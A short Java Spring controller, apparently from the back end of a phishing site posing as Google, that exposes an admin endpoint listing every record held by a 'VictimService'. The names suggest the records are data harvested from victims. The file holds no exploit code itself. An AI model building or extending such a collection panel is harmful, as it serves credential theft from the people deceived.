package fake.google.fake.controller;

import fake.google.fake.service.VictimService;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Admin {
    private final VictimService victimService;

    public Admin(VictimService victimService) {
        this.victimService = victimService;
    }


    @GetMapping("admin/api/all")
    public ResponseEntity getAll(){
        return ResponseEntity.ok(victimService.getAll());
    }
}
